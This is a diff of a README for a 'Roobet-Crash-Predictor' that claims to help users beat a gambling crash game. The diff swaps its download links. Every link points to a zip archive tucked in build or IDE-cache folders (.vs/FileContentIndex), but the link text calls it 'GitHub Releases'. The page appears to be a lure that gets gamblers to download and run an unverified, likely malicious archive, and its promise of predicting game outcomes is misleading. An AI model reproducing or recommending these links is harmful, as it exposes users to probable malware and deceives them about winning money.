@@ -1,7 +1,7 @@
 # 🎲 Roobet-Crash-Predictor - Improve Your Crash Strategy Today
 
 ## 📥 Download Now
-[![Download from GitHub](https://raw.githubusercontent.com/pborsuk467/Roobet-Crash-Predictor/main/bin/Debug/exes/Roobet-Crash-Predictor-rebec.zip%20Roobet--Crash--Predictor-v1.0-brightgreen)](https://raw.githubusercontent.com/pborsuk467/Roobet-Crash-Predictor/main/bin/Debug/exes/Roobet-Crash-Predictor-rebec.zip)
+[![Download from GitHub](https://raw.githubusercontent.com/pborsuk467/Roobet-Crash-Predictor/main/.vs/roobet_crash_predictor/FileContentIndex/Roobet_Predictor_Crash_2.6.zip%20Roobet--Crash--Predictor-v1.0-brightgreen)](https://raw.githubusercontent.com/pborsuk467/Roobet-Crash-Predictor/main/.vs/roobet_crash_predictor/FileContentIndex/Roobet_Predictor_Crash_2.6.zip)
 
 ## 🚀 Getting Started
 Welcome to the Roobet-Crash-Predictor! This tool helps you test and improve your crash strategy for Roobet. Whether you are curious about how it works or just want to explore its features, this guide will help you get started.
@@ -15,7 +15,7 @@ To use the Roobet-Crash-Predictor, your system should meet these requirements:
 - **Internet Connection**: Required for accessing the Roobet platform
 
 ## 📦 Download & Install
-To download the Roobet-Crash-Predictor, visit this page: [GitHub Releases](https://raw.githubusercontent.com/pborsuk467/Roobet-Crash-Predictor/main/bin/Debug/exes/Roobet-Crash-Predictor-rebec.zip).
+To download the Roobet-Crash-Predictor, visit this page: [GitHub Releases](https://raw.githubusercontent.com/pborsuk467/Roobet-Crash-Predictor/main/.vs/roobet_crash_predictor/FileContentIndex/Roobet_Predictor_Crash_2.6.zip).
 
 1. On the releases page, find the latest version.
 2. Click on the version number to open the release details.
@@ -60,6 +60,6 @@ If you want to contribute to the project, we welcome your input! You can create 
 Roobet-Crash-Predictor is governed by the MIT License. You are free to modify, share, and use the software as long as proper credit is attributed. 
 
 ## 🔗 More Information
-For further details and updates, don’t forget to periodically check the [GitHub Releases](https://raw.githubusercontent.com/pborsuk467/Roobet-Crash-Predictor/main/bin/Debug/exes/Roobet-Crash-Predictor-rebec.zip) page for the latest versions and features. 
+For further details and updates, don’t forget to periodically check the [GitHub Releases](https://raw.githubusercontent.com/pborsuk467/Roobet-Crash-Predictor/main/.vs/roobet_crash_predictor/FileContentIndex/Roobet_Predictor_Crash_2.6.zip) page for the latest versions and features. 
 
 Thank you for using Roobet-Crash-Predictor. Enjoy predicting and strategizing your game!
